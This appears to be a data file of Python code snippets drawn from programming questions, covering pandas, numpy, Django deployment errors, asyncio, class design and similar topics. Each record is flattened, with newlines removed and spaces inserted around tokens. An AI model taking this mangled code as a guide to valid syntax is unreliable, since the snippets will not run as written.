"# ! /usr/bin/env python2.6print 'begin ' x = [ 0 , 1 , undefined ] print ' x ' # ! /usr/bin/env python2.6print 'begin'raise Exception ( 'stopping here ' ) # ! /usr/bin/env python2.6import sysprint 'begin'sys.exit ( 0 ) # 0 0x000000364340e890 in __connect_nocancel ( ) from /lib64/libpthread.so.0 # 1 0x00007ffff18960d8 in ? ? ( ) from /usr/lib64/python2.6/lib-dynload/_socketmodule.so # 2 0x00007ffff189815c in ? ? ( ) from /usr/lib64/python2.6/lib-dynload/_socketmodule.so # 3 0x00007ffff7d0a706 in PyEval_EvalFrameEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 4 0x00007ffff7d0c797 in PyEval_EvalCodeEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 5 0x00007ffff7d0abe4 in PyEval_EvalFrameEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 6 0x00007ffff7d0bccf in PyEval_EvalFrameEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 7 0x00007ffff7d0bccf in PyEval_EvalFrameEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 8 0x00007ffff7d0c797 in PyEval_EvalCodeEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 9 0x00007ffff7c9adb0 in ? ? ( ) from /usr/lib64/libpython2.6.so.1.0 # 10 0x00007ffff7c70303 in PyObject_Call ( ) from /usr/lib64/libpython2.6.so.1.0 # 11 0x00007ffff7d04dd3 in PyEval_CallObjectWithKeywords ( ) from /usr/lib64/libpython2.6.so.1.0 # 12 0x00007ffff7d28cd2 in PyErr_PrintEx ( ) from /usr/lib64/libpython2.6.so.1.0 # 13 0x00007ffff7d29297 in PyRun_SimpleFileExFlags ( ) from /usr/lib64/libpython2.6.so.1.0 # 14 0x00007ffff7d35c32 in Py_Main ( ) from /usr/lib64/libpython2.6.so.1.0 # 15 0x000000364281ecdd in __libc_start_main ( ) from /lib64/libc.so.6 # 16 0x0000000000400649 in _start ( )"
"clf=RandomForestClassifier ( random_state = 42 , class_weight= '' balanced '' ) k_fold = KFold ( n_splits=10 , shuffle=True , random_state=42 ) new_scores = cross_val_score ( clf , X , y , cv=k_fold , n_jobs=1 ) print ( new_scores.mean ( ) )"
"from Foundation import *from Quartz import *url = NSURL.fileURLWithPath_ ( `` test.pdf '' ) pdfdoc = PDFDocument.alloc ( ) .initWithURL_ ( url ) assert pdfdoc , `` failed to create document '' print `` reading pdf file '' attrs = { } attrs [ PDFDocumentTitleAttribute ] = `` THIS IS THE TITLE '' attrs [ PDFDocumentAuthorAttribute ] = `` A . Author and B . Author '' PDFDocumentTitleAttribute = `` test '' pdfdoc.setDocumentAttributes_ ( attrs ) pdfdoc.writeToFile_ ( `` mynewfile.pdf '' ) print `` pdf made '' PdfID0:242b7e252f1d3fdd89b35751b3f72d3PdfID1:242b7e252f1d3fdd89b35751b3f72d3NumberOfPages : 4 InfoKey : CreatorInfoValue : PScript5.dll Version 5.2.2InfoKey : TitleInfoValue : Microsoft Word - PROGRESS ON THE GABION HOUSE Compressed.docInfoKey : ProducerInfoValue : GPL Ghostscript 8.15InfoKey : AuthorInfoValue : PWKInfoKey : ModDateInfoValue : D:20101021193627-05'00'InfoKey : CreationDateInfoValue : D:20101008152350ZPdfID0 : d5fd6d3960122ba72117db6c4d46cefaPdfID1 : 24bade63285c641b11a8248ada9f19NumberOfPages : 4"
"from enum import auto , Flagclass TranslateableFlag ( Flag ) : @ classmethod def base ( cls ) : pass def translate ( self ) : base = self.base ( ) if self in base : return base [ self ] else : ret = [ ] for basic in base : if basic in self : ret.append ( base [ basic ] ) return `` | `` .join ( ret ) class Students ( TranslateableFlag ) : ALICE = auto ( ) BOB = auto ( ) CHARLIE = auto ( ) ALL = ALICE | BOB | CHARLIE @ classmethod def base ( cls ) : return { Students.ALICE : `` Alice '' , Students.BOB : `` Bob '' , Students.CHARLIE : `` Charlie '' } ( ( Students.ALICE | Students.BOB ) .translate ( ) ) [ Out ] : 'Alice | Bob ' @ abstractclassmethod @ classmethod def base ( cls ) : pass"
"dflist= [ [ '123 ' , [ 'abc ' , 'qw3 ' , '123 ' ] ] , [ 'ab12 ' , [ '3e4r5 ' , '12we3 ' , 'asd23 ' , 'q2w3 ' ] ] ] df=pd.DataFrame ( dflist , columns= [ 'check ' , 'checklist ' ] ) check checklist0 123 [ abc , qw3 , 123 ] 1 ab12 [ 3e4r5 , 12we3 , asd23 , q2w3 ] check checklist checkisin0 123 [ abc , qw3 , 123 ] True1 ab12 [ 3e4r5 , 12we3 , asd23 , q2w3 ] False df [ 'checkisin ' ] =df.check.isin ( df.checklist ) check checklist checkisin0 123 [ abc , qw3 , 123 ] False1 ab12 [ 3e4r5 , 12we3 , asd23 , q2w3 ] False AttributeError : ( `` 'Series ' object has no attribute 'check ' '' , 'occurred at index check ' ) df [ 'checkisin ' ] =df.apply ( lambda x : x [ 'check ' ] in x.checklist ) KeyError : ( 'check ' , 'occurred at index check ' )"
"V = np.einsum ( 'aji , jk , akl- > il ' , samples , np.linalg.inv ( U ) / ( r*n ) , samples ) U = np.einsum ( 'aij , jk , alk- > il ' , samples , np.linalg.inv ( V ) / ( r*p ) , samples ) V = sum ( np.dot ( x.T , scipy.linalg.solve ( A , x ) ) for x in samples )"
try : from settings_production import *except ImportError : pass
mng.frame.Maximize ( True ) mng.window.showMaximized ( ) mng.resize ( *mng.window.maxsize ( ) ) mng.full_screen_toggle ( ) mng.window.state ( 'zoomed ' ) from scipy import miscimport matplotlib.pyplot as pltimage = misc.lena ( ) plt.imshow ( image ) mng = plt.get_current_fig_manager ( ) mng.frame.Maximize ( True ) plt.show ( )
"import numpy as npimport timeitm = [ 3,7,1,2 ] f = lambda m , x : m [ 0 ] *x**3 + m [ 1 ] *x**2 + m [ 2 ] *x + m [ 3 ] np_poly = np.poly1d ( m ) np_polyval = lambda m , x : np.polyval ( m , x ) np_pow = lambda m , x : np.power ( x , [ 3,2,1,0 ] ) .dot ( m ) print 'result= { } , timeit= { } '.format ( f ( m,12 ) , timeit.Timer ( ' f ( m,12 ) ' , 'from __main__ import f , m ' ) .timeit ( 10000 ) ) result=6206 , timeit=0.0036780834198print 'result= { } , timeit= { } '.format ( np_poly ( 12 ) , timeit.Timer ( 'np_poly ( 12 ) ' , 'from __main__ import np_poly ' ) .timeit ( 10000 ) ) result=6206 , timeit=0.180546045303print 'result= { } , timeit= { } '.format ( np_polyval ( m,12 ) , timeit.Timer ( 'np_polyval ( m,12 ) ' , 'from __main__ import np_polyval , m ' ) .timeit ( 10000 ) ) result=6206 , timeit=0.227771043777print 'result= { } , timeit= { } '.format ( np_pow ( m,12 ) , timeit.Timer ( 'np_pow ( m,12 ) ' , 'from __main__ import np_pow , m ' ) .timeit ( 10000 ) ) result=6206 , timeit=0.168987989426"
"ImportError : Could not import settings 'cm_central.settings ' ( Is it on sys.path ? Is there an import error in the settings file ? ) : No module named cm_central.settings < VirtualHost *:80 > WSGIScriptAlias / /home/cmc/src/cm_central/cm_central/wsgi.py WSGIDaemonProcess cm-central.johalla.de python-path=/home/cmc/src/cm_central : /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages WSGIProcessGroup cm-central.johalla.de < Directory /home/cmc/src/cm_central/cm_central > < Files wsgi.py > Order deny , allow Allow from all < /Files > < /Directory > < /VirtualHost > import osos.environ.setdefault ( `` DJANGO_SETTINGS_MODULE '' , `` cm_central.settings '' ) from django.core.wsgi import get_wsgi_applicationfrom dj_static import Clingapplication = Cling ( get_wsgi_application ( ) ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] mod_wsgi ( pid=10273 ) : Target WSGI script '/home/cmc/src/cm_central/cm_central/wsgi.py ' can not be loaded as Python module . [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] mod_wsgi ( pid=10273 ) : Exception occurred processing WSGI script '/home/cmc/src/cm_central/cm_central/wsgi.py ' . [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] Traceback ( most recent call last ) : [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/src/cm_central/cm_central/wsgi.py '' , line 16 , in < module > [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] application = Cling ( get_wsgi_application ( ) ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages/django/core/wsgi.py '' , line 14 , in get_wsgi_application [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] django.setup ( ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages/django/__init__.py '' , line 20 , in setup [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] configure_logging ( settings.LOGGING_CONFIG , settings.LOGGING ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages/django/conf/__init__.py '' , line 46 , in __getattr__ [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] self._setup ( name ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages/django/conf/__init__.py '' , line 42 , in _setup [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] self._wrapped = Settings ( settings_module ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] File `` /home/cmc/virtualenvs/cmc/lib/python2.7/site-packages/django/conf/__init__.py '' , line 98 , in __init__ [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] % ( self.SETTINGS_MODULE , e ) [ Sun Nov 09 12:00:01 2014 ] [ error ] [ client 192.168.122.40 ] ImportError : Could not import settings 'cm_central.settings ' ( Is it on sys.path ? Is there an import error in the settings file ? ) : No module named cm_central.settings [ Sun Nov 09 12:04:06 2014 ] [ notice ] Graceful restart requested , doing restart [ Sun Nov 09 12:04:06 2014 ] [ notice ] Apache/2.2.22 ( Debian ) PHP/5.4.4-14+deb7u14 mod_wsgi/3.3 Python/2.7.3 configured -- resuming normal operations [ Sun Nov 09 21:34:15 2014 ] [ error ] Not Found : /"
"def time_count_map ( data ) : `` '' '' Time count map function . '' '' '' ( entry , text_fn ) = data text = text_fn ( ) try : q = text.split ( '\n ' ) for m in q : reader = csv.reader ( [ m.replace ( '\0 ' , `` ) ] , skipinitialspace=True ) for s in reader : `` '' '' Calculate time elapsed '' '' '' sdw = s [ 1 ] start_date = time.strptime ( sdw , '' % m/ % d/ % y % I : % M : % S % p '' ) edw = s [ 2 ] end_date = time.strptime ( edw , '' % m/ % d/ % y % I : % M : % S % p '' ) time_difference = time.mktime ( end_date ) - time.mktime ( start_date ) yield ( s [ 0 ] , time_difference ) except IndexError , e : logging.debug ( e ) def time_count_reduce ( key , values ) : `` '' '' Time count reduce function . '' '' '' time = 0.0 for subtime in values : time += float ( subtime ) realtime = int ( time ) yield `` % s : % d\n '' % ( key , realtime ) class TimeCountPipeline ( base_handler.PipelineBase ) : `` '' '' A pipeline to run Time count demo . Args : blobkey : blobkey to process as string . Should be a zip archive with text files inside. `` '' '' def run ( self , filekey , blobkey ) : logging.debug ( `` filename is % s '' % filekey ) output = yield mapreduce_pipeline.MapreducePipeline ( `` time_count '' , `` main.time_count_map '' , `` main.time_count_reduce '' , `` mapreduce.input_readers.BlobstoreZipInputReader '' , `` mapreduce.output_writers.BlobstoreOutputWriter '' , mapper_params= { `` blob_key '' : blobkey , } , reducer_params= { `` mime_type '' : `` text/plain '' , } , shards=32 ) yield StoreOutput ( `` TimeCount '' , filekey , output ) mapreduce : - name : Make messages lowercase params : - name : done_callback value : /done mapper : handler : main.lower_case_posts input_reader : mapreduce.input_readers.DatastoreInputReader params : - name : entity_kind default : main.Post - name : processing_rate default : 100 - name : shard_count default : 4- name : Make messages upper case params : - name : done_callback value : /done mapper : handler : main.upper_case_posts input_reader : mapreduce.input_readers.DatastoreInputReader params : - name : entity_kind default : main.Post - name : processing_rate default : 100 - name : shard_count default : 4"
"if foo < bar < baz : do something . class Bar : def __lt__ ( self , other ) : do something else if foo.__lt__ ( bar ) and bar.__lt__ ( baz ) : do something . > > > class Bar : def __init__ ( self , name ) : self.name = name print ( '__init__ ' , self.name ) def __lt__ ( self , other ) : print ( '__lt__ ' , self.name , other.name ) return self.name < other.name > > > Bar ( ' a ' ) < Bar ( ' b ' ) < Bar ( ' c ' ) ( '__init__ ' , ' a ' ) ( '__init__ ' , ' b ' ) ( '__lt__ ' , ' a ' , ' b ' ) ( '__init__ ' , ' c ' ) ( '__lt__ ' , ' b ' , ' c ' ) True > > > Bar ( ' b ' ) < Bar ( ' a ' ) < Bar ( ' c ' ) ( '__init__ ' , ' b ' ) ( '__init__ ' , ' a ' ) ( '__lt__ ' , ' b ' , ' a ' ) False > > >"
"# timer event that runs every .1 second and processes events in a queuesome_event_timer ( ) : events.process_next ( ) class Event_queue : def __init__ ( self ) : self.events = [ ] def push ( self , event , parameters ) : self.events.insert ( len ( self.events ) , event , parameters ) def process_next ( self ) : event = self.pop ( 0 ) event [ 0 ] ( event [ 1 ] ) class Foo : def __init__ ( self , start_value = 1 ) : self.value = start_value def update_value ( self , multiple ) : self.value *= multiple def return_bah ( self ) return self.value + 3class Bar : def __init__ ( self , number1 , number2 ) : self.init = number1 self.add = number2 def print_alt_value ( self , in_value ) : print in_value * ( self.init + self.add ) events2 = Event_queue2 ( ) foo1 = Foo ( 4 ) -- -- > foo1.value = 4 herebar1 = Bar ( 4 , 2 ) events2.push ( foo1.update_value,1.5 ) events2.push ( bar1.print_alt_value , foo1.value ) events2.push ( bar.print_alt_value , foo1.return_bah ( ) ) events2.process_next ( ) -- -- > should process update_value to change foo.value to 6events2.process_next ( ) -- -- > should process print_alt_value in bar class - expected 36events2.process_next ( ) -- -- > should process print_alt_value - expected 54 names = [ `` test1 '' , `` test2 '' ] for name in names : names_objs [ name ] = Foo ( 4 ) for name in names_list : events2.push ( lambda : names_objs [ name ] .update_value ( 2 ) ) name_obj_hold = name_objs [ name ]"
"loss = utils_tf.model_loss ( y , preds , mean=False ) grad , = tf.gradients ( loss , x ) scaled_grad = eps * normalized_gradadv_img = img + scaled_grad"
"from flask import Flaskimport timeapp = Flask ( __name__ ) @ app.route ( '/ ' ) def hello_world ( ) : time.sleep ( 0.1 ) // heavy calculations here : ) return 'Hello World ! 'if __name__ == '__main__ ' : app.run ( ) import requestsfrom time import perf_counter , sleep # this is the baseline , sequential calls to requests.getstart = perf_counter ( ) for i in range ( 10 ) : r = requests.get ( `` http : //127.0.0.1:5000/ '' ) stop = perf_counter ( ) print ( f '' synchronous took { stop-start } seconds '' ) # 1.062 secs # now the naive asyncio versionimport asyncioloop = asyncio.get_event_loop ( ) async def get_response ( ) : r = requests.get ( `` http : //127.0.0.1:5000/ '' ) start = perf_counter ( ) loop.run_until_complete ( asyncio.gather ( * [ get_response ( ) for i in range ( 10 ) ] ) ) stop = perf_counter ( ) print ( f '' asynchronous took { stop-start } seconds '' ) # 1.049 secs # the fast asyncio versionstart = perf_counter ( ) loop.run_until_complete ( asyncio.gather ( * [ loop.run_in_executor ( None , requests.get , 'http : //127.0.0.1:5000/ ' ) for i in range ( 10 ) ] ) ) stop = perf_counter ( ) print ( f '' asynchronous ( executor ) took { stop-start } seconds '' ) # 0.122 secs # finally , aiohttpimport aiohttpasync def get_response ( session ) : async with session.get ( `` http : //127.0.0.1:5000/ '' ) as response : return await response.text ( ) async def main ( ) : async with aiohttp.ClientSession ( ) as session : await get_response ( session ) start = perf_counter ( ) loop.run_until_complete ( asyncio.gather ( * [ main ( ) for i in range ( 10 ) ] ) ) stop = perf_counter ( ) print ( f '' aiohttp took { stop-start } seconds '' ) # 0.121 secs # File operations ( such as logging ) can block the # event loop : run them in a thread pool ."
"import pandas as pddf = pd.DataFrame ( data = { ' a ' : [ 1 , 2 , 3 ] , ' b ' : [ 4 , 5 , 6 ] } ) def add ( a , b , c ) : return a + b * cdf [ ' c ' ] = add ( df [ ' a ' ] , df [ ' b ' ] , 2 ) print df > > a b c > > 0 1 4 10 > > 1 2 5 14 > > 2 3 6 18"
"klass = type ( name , ( TestCase , ) , attrs ) setattr ( current_module , name , klass ) from django.test import TestCasefrom sys import modulescurrent_module = modules [ __name__ ] def passer ( self , *args , **kw ) : self.assertEqual ( 1 , 1 ) def failer ( self , *args , **kw ) : self.assertEqual ( 1 , 2 ) # Create a hundred ... for i in xrange ( 100 ) : # ... of a stupid TestCase class that has 1 method that passes if ` i ` is # even and fails if ` i ` is odd klass_name = `` Test_ % s '' % i if i % 2 : # Test passes if even klass_attrs = { 'test_something_ % s ' % i : passer } else : # Fail if odd klass_attrs = { 'test_something_ % s ' % i : failer } klass = type ( klass_name , ( TestCase , ) , klass_attrs ) # Set the class as `` child '' of the current module so that django test runner # finds it setattr ( current_module , klass_name , klass )"
In [ 74 ] : import sysIn [ 75 ] : a = { ' a ' : 'blah ' } In [ 76 ] : sys.getsizeof ( a ) Out [ 76 ] : 280In [ 77 ] : a [ ' a ' ] = NoneIn [ 79 ] : sys.getsizeof ( a ) Out [ 79 ] : 280In [ 80 ] : del a [ ' a ' ] In [ 81 ] : sys.getsizeof ( a ) Out [ 81 ] : 280
TRAC XML-RPC method called : supervisor.getAllProcessInfo ( ) TRAC XML-RPC method supervisor.getAllProcessInfo ( ) returned fault : [ 1 ] UNKNOWN_METHODTRAC 127.0.0.1:44458 - - [ 11/Nov/2009:09:51:02 +0300 ] `` POST /RPC2 HTTP/1.1 '' 200 391
smth = Something ( ) smth.subspace.do_smth ( ) smth.another_subspace.do_smth_else ( )
"n = 10**7a = list ( range ( n ) ) b = list ( range ( n ) ) pairs = list ( zip ( a , b ) ) def f1 ( a , b , pairs ) : a [ : ] , b [ : ] = zip ( *pairs ) def f2 ( a , b , pairs ) : for i , ( a [ i ] , b [ i ] ) in enumerate ( pairs ) : pass f1 1.06 f2 1.57 f1 0.96 f2 1.69 f1 1.00 f2 1.85 f1 1.11 f2 1.64 f1 0.95 f2 1.63 f1 7.28 f2 1.92 f1 5.34 f2 1.66 f1 6.46 f2 1.70 f1 6.82 f2 1.59 f1 5.88 f2 1.63 from timeit import timeit , default_timern = 10**7a = list ( range ( n ) ) b = list ( range ( n ) ) pairs = list ( zip ( a , b ) ) def f1 ( a , b , pairs ) : a [ : ] , b [ : ] = zip ( *pairs ) def f2 ( a , b , pairs ) : for i , ( a [ i ] , b [ i ] ) in enumerate ( pairs ) : passprint ( 'timeit ' ) for _ in range ( 5 ) : for f in f1 , f2 : t = timeit ( lambda : f ( a , b , pairs ) , number=1 ) print ( f.__name__ , ' % .2f ' % t , end= ' ' ) print ( ) print ( 'default_timer ' ) for _ in range ( 5 ) : for f in f1 , f2 : t0 = default_timer ( ) f ( a , b , pairs ) t = default_timer ( ) - t0 print ( f.__name__ , ' % .2f ' % t , end= ' ' ) print ( )"
"from abc import ABCMetaclass OldProduct ( metaclass=ABCMeta ) : c_type : str c_brand : str def __init__ ( self , name : str ) : self.name = nameclass OldLegoBox ( OldProduct ) : c_type = `` Toy '' c_brand = `` Lego '' def __init__ ( self , name : str , price : float ) : self.name = name self.price = priceoldbox1 = OldLegoBox ( `` Princess '' , 12.3 ) print ( oldbox1.c_brand ) oldbox2 = OldLegoBox ( `` Knight '' , 42.3 ) print ( oldbox2.c_brand ) from abc import ABCMetafrom dataclasses import dataclass , field @ dataclassclass Product ( metaclass=ABCMeta ) : c_type : str c_brand : str name : str @ dataclassclass LegoBox ( Product ) : name : str price : float c_type : str = field ( default= '' Toy '' , init=False ) c_brand : str = field ( default= '' Lego '' , init=False ) box1 = LegoBox ( `` Princess '' , 12.3 ) print ( box1 ) box1.price = 1000box1.name = `` toto '' box1.c_brand = `` some brand '' print ( box1 ) box2 = LegoBox ( `` Knight '' , 42.3 ) print ( box2 )"
"data_set = [ { 'Active rate ' : [ 0.98 , 0.97 , 0.96 ] } , { 'Operating Expense ' : [ 3.104 , 3.102 , 3.101 ] } ] Active rate Operating Expense0.98 3.1040.97 3.1020.96 3.101 data_set = [ { 'Active rate ' : [ 0.98 , 0.931588 , 0.941192 ] } , { 'Operating Expense ' : [ 3.104 , 2.352 , 2.304 ] } ] import csvwith open ( 'names.csv ' , ' w ' ) as csvfile : fieldnames = [ 'Active rate ' , 'Operating Expense ' ] writer = csv.DictWriter ( csvfile , fieldnames=fieldnames ) writer.writeheader ( ) writer.writerow ( { 'Active rate ' : 0.98 , 'Operating Expense ' : 3.102 } ) writer.writerow ( { 'Active rate ' : 0.97 , 'Operating Expense ' : 3.11 } ) writer.writerow ( { 'Active rate ' : 0.96 , 'Operating Expense ' : 3.109 } )"
"find /usr -xdev -type d -name '*share ' ^^^^^^^^^^^^ = > name with shell expansion of '*share ' ^^^^ = > Directory ( not a file ) ^^^ = > Do not go to external file systems ^^^ = > the /usr directory ( could be multiple directories for path , dirs , files in os.walk ( root ) : if files : for file in files : print os.path.join ( path , file ) # create pipe to 'find ' with the commands with arg of 'root'find_cmd='find % s -type f ' % rootargs=shlex.split ( find_cmd ) p=subprocess.Popen ( args , stdout=subprocess.PIPE ) out , err=p.communicate ( ) out=out.rstrip ( ) # remove terminating \nfor line in out.splitlines ( ) print line for path , dirs , files in os.walk ( root ) : if files : for file in files : p=os.path.join ( path , file ) if os.path.isfile ( p ) and not os.path.islink ( p ) : print ( p )"
"import numpy as npfrom scipy.spatial import distance n = 2000arr = np.random.rand ( n,2 ) d = distance.cdist ( arr , arr ) from scipy import sparsemax_dist = 5dist = np.array ( [ [ 0,1,3,6 ] , [ 1,0,8,7 ] , [ 3,8,0,4 ] , [ 6,7,4,0 ] ] ) print distarray ( [ [ 0 , 1 , 3 , 6 ] , [ 1 , 0 , 8 , 7 ] , [ 3 , 8 , 0 , 4 ] , [ 6 , 7 , 4 , 0 ] ] ) dist [ dist > =max_dist ] = 0dist = np.triu ( dist ) print distarray ( [ [ 0 , 1 , 3 , 0 ] , [ 0 , 0 , 0 , 0 ] , [ 0 , 0 , 0 , 4 ] , [ 0 , 0 , 0 , 0 ] ] ) sdist = sparse.lil_matrix ( dist ) print sdist ( 0 , 1 ) 1 ( 2 , 3 ) 4 ( 0 , 2 ) 3"
"import path.MyClassMyClass.foo = bar import path.MyClasssetattr ( MyClass , 'foo ' , bar )"
"for count , item in enumerate ( contents ) : if count == 10 : break"
"< script type= '' text/javascript '' > var _gaq = _gaq || [ ] ; _gaq.push ( [ '_setAccount ' , ' { { GOOGLE_ANALYTICS } } ' ] ) ; _gaq.push ( [ '_trackPageview ' ] ) ; ( function ( ) { var ga = document.createElement ( 'script ' ) ; ga.type = 'text/javascript ' ; ga.async = true ; ga.src = ( 'https : ' == document.location.protocol ? 'https : //ssl ' : 'http : //www ' ) + '.google-analytics.com/ga.js ' ; var s = document.getElementsByTagName ( 'script ' ) [ 0 ] ; s.parentNode.insertBefore ( ga , s ) ; } ) ( ) ; < /script >"
"# As an example one would be interested in turning this ... parser_grp.add_argument ( '-o ' , ' -- outputfile ' , help= '' Output file . `` , default=sys.stdout , metavar= '' TXT '' , type=argparse.FileType ( ' w ' ) ) # Into that ... from somewhere import FileTypeWithExtensionCheck parser_grp.add_argument ( '-o ' , ' -- outputfile ' , help= '' Output file . `` , default=sys.stdout , metavar= '' TXT '' , type=FileTypeWithExtensionCheck ( ' w ' , ' . [ Tt ] [ Xx ] [ Tt ] $ ' ) )"
"d = { `` a '' : { `` b '' : { `` c '' : 4 } } } l = [ `` a '' , `` b '' , `` c '' ] for x in l : d = d [ x ] print ( d ) # 4"
"class Shape : def __init__ ( self , shapename , **kwds ) : self.shapename = shapename super ( ) .__init__ ( **kwds ) class ColoredShape ( Shape ) : def __init__ ( self , color , **kwds ) : self.color = color super ( ) .__init__ ( **kwds ) class Base : def __init__ ( self , x , y , z ) : self.x = x self.y = y self.z = zclass Derived ( Base ) : def __init__ ( self , x , y , a ) : self.a = a super ( ) .__init__ ( x , y , None ) : Derived.__init__ ( self , a , x , y ) class collections.defaultdict ( [ default_factory [ , ... ] ] ) int result ; PyObject *newargs ; Py_ssize_t n = PyTuple_GET_SIZE ( args ) ; ... newargs = PySequence_GetSlice ( args , 1 , n ) ; ... result = PyDict_Type.tp_init ( self , newargs , kwds ) ;"
random.Random ( hash ( `` a '' ) ) .random ( ) == random.Random ( `` a '' ) .random ( )
< a href= '' //i.imgur.com/ahreflink.jpg '' class= '' zoom '' > < img class= '' post-image-placeholder '' src= '' //i.imgur.com/imgsrclink.jpg '' > < /img > < /a > < a name= '' missing ! oh no ! `` > < img class= '' post-image-placeholder '' src= '' //i.imgur.com/imgsrclink.jpg '' > < /img > < /a >
"d_data = { 'key_1 ' : value_1 , 'key_2 ' : value_2 , 'key_3 ' : value_3 , 'key_x ' : value_x , 'key_n ' : value_n } for key , value in columns.items ( ) : do something 'key_x ' : value_x"
"\spam \morespam child.py base.py\eggs user.py class Base ( object ) : def hello ( self ) : print 'Um , wot ? ' from ..base import Base # references the parent package correctly , # but fails when this module is executed individuallyclass Child ( Base ) : def hello ( self ) : print 'Hello , world ! 'if __name__ == '__main__ ' : import unittest # ... unit test code ... from spam.morespam.child import Childprint Child ( ) .hello ( ) if __name__ == '__main__ ' : import sys , os sys.path.append ( os.path.abspath ( os.path.join ( sys.path [ 0 ] , '.. ' ) ) )"
"class MyTestCase ( unittest.TestCase ) : @ classmethod def setUpClass ( cls ) : my_app.app.config [ 'TESTING ' ] = True cls.client = my_app.app.test_client ( ) cls.client = my_app.all_apps.test_client ( ) all_apps = DispatcherMiddleware ( my_app , { '/backend ' : backend_app , } )"
"x = numpy.array ( [ 1 , 4 , 2 , 3 , -1 , -6 , -6 , 5 , 6 , 7 , 3 , 1 , -5 , 4 , 9 , -5 , -2 , -1 , -4 ] ) for i in range ( len ( x ) ) : if x [ i ] < 0. : y [ i ] = sum ( x [ i ] )"
class SomeClass : def do_it ( self ) : cls = enclosing_class ( ) # < -- I need this . print ( cls ) class DerivedClass ( SomeClass ) : passobj = DerivedClass ( ) # I want this to print 'SomeClass'.obj.do_it ( )
"response.headers [ 'Content-Type ' ] = 'text/csv'response.headers [ 'Content-Disposition ' ] = 'attachment ; filename=xxx.csv'return response.stream ( dynamically_generated_csv , request=request ) del response.headers [ 'Cache-Control ' ]"
heroku run python manage.py dumpdata text 11:09 PM $ > heroku run python manage.py dumpdata text | wc -c10835111:09 PM $ > ! ! 12062911:09 PM $ > ! ! 12269311:10 PM $ > ! ! 12294911:10 PM $ > ! ! 15341911:13 PM $ > ! ! 120877
"class B ( object ) : def show ( self ) : self.__a = `` test '' print `` B '' def this_b ( self ) : print `` this_b '' print self.__a print getattr ( self , '__a ' ) # exceptionclass C ( B ) : def show ( self ) : print `` C '' # B.show ( self ) super ( C , self ) .show ( ) def call ( self ) : print `` call '' self.show ( ) self.this_b ( ) # print self.__aC ( ) .call ( )"
"class FooList ( list ) : def __iter__ ( self ) : return iter ( self ) def next ( self ) : return 3 def __getitem__ ( self , idx ) : return 3 > > > zz = FooList ( [ 1,2,3 ] ) > > > [ x for x in zz ] # Hangs because of the self-reference in ` __iter__ ` . > > > zz [ 0 ] 3 > > > zz [ 1 ] 3 def add3 ( a , b , c ) : return a + b + c > > > add3 ( *zz ) 6 # I expected either 9 or for the interpreter to hang like the comprehension ! class FooList ( object ) : def __init__ ( self , lst ) : self.lst = lst def __iter__ ( self ) : raise ValueError def next ( self ) : return 3 def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) def __setitem__ ( self , idx , itm ) : self.lst.__setitem__ ( idx , itm ) In [ 234 ] : zz = FooList ( [ 1,2,3 ] ) In [ 235 ] : [ x for x in zz ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-235-ad3bb7659c84 > in < module > ( ) -- -- > 1 [ x for x in zz ] < ipython-input-233-dc9284300db1 > in __iter__ ( self ) 2 def __init__ ( self , lst ) : 3 self.lst = lst -- -- > 4 def __iter__ ( self ) : raise ValueError 5 def next ( self ) : return 3 6 def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) ValueError : In [ 236 ] : add_3 ( *zz ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-236-f9bbfdc2de5c > in < module > ( ) -- -- > 1 add_3 ( *zz ) < ipython-input-233-dc9284300db1 > in __iter__ ( self ) 2 def __init__ ( self , lst ) : 3 self.lst = lst -- -- > 4 def __iter__ ( self ) : raise ValueError 5 def next ( self ) : return 3 6 def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) ValueError : class FooList ( object ) : def __init__ ( self , lst ) : self.lst = lst self.iter_loc = -1 def __iter__ ( self ) : return self def next ( self ) : if self.iter_loc < len ( self.lst ) -1 : self.iter_loc += 1 return 3 else : self.iter_loc = -1 raise StopIteration def __getitem__ ( self , idx ) : return self.lst.__getitem__ ( idx ) def __setitem__ ( self , idx , itm ) : self.lst.__setitem__ ( idx , itm ) In [ 247 ] : zz = FooList ( [ 1,2,3 ] ) In [ 248 ] : ix = iter ( zz ) In [ 249 ] : ix.next ( ) Out [ 249 ] : 3In [ 250 ] : ix.next ( ) Out [ 250 ] : 3In [ 251 ] : ix.next ( ) Out [ 251 ] : 3In [ 252 ] 